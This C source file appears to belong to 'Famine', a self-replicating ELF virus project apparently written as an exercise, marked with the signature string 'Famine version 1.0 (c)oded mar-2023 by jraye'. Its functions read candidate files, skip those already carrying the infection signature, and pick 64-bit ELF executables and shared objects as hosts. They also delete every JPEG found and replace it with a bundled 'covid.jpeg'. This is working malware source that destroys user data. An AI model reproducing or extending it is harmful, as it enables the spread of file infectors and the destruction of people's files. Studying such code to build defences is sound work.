#include "famine.h"

ssize_t get_file_size(const char *file_name)
{
	struct stat stat;

	if (!(lstat(file_name, &stat) == 0))
	{
		return ERROR_CODE;
	}

	return stat.st_size;
}

int copy_file(t_woody *woody, char *filename)
{
	int fd = open(filename, O_RDONLY);

	if (fd < 0)
	{
		return ERROR_CODE;
	}

	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
	{
		close(fd);
		return ERROR_CODE;
	}
	char *string = woody->addr;
	for (int i = 0; i < woody->filesize; i++)
	{
		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye", 45) != NULL)
		{
			return ERROR_CODE;
		}
	}
	close(fd);
	return 0;
}

void do_replace_image(char *filename)
{
	remove(filename);

	FILE *input, *output;
	char buffer[512];
	size_t nread;

	input = fopen("./static/covid.jpeg", "rb");
	output = fopen(filename, "wb");
	while (nread = fread(buffer, sizeof(char), sizeof(buffer), input)){
		fwrite(buffer, sizeof(char), nread, output);
	}
}

int check_fileformat(unsigned char *c, char *filename)
{

	if (c[0] == 0x7f &&
		c[1] == 'E' &&
		c[2] == 'L' &&
		c[3] == 'F' &&
		c[4] == ELFCLASS64 &&
		(c[16] == ET_EXEC || c[16] == ET_DYN))
	{
		return 0;
	}
	else if (c[0] == 0xFF &&
			 c[1] == 0xD8 &&
			 c[2] == 0xFF)
	{
		do_replace_image(filename);
		return ERROR_CODE;
	}
	else
	{
		return ERROR_CODE;
	}
}

int read_elf_file(t_woody *woody, char *filename)
{
	woody->filesize = get_file_size(filename);
	if (woody->filesize == ERROR_CODE)
	{
		return ERROR_CODE;
	}

	woody->filename = filename;
	woody->addr = malloc(woody->filesize);
	if (woody->addr == NULL)
	{
		return ERROR_CODE;
	}

	if (copy_file(woody, filename) == ERROR_CODE)
	{
		return ERROR_CODE;
	}
	return check_fileformat(woody->addr, filename);
}
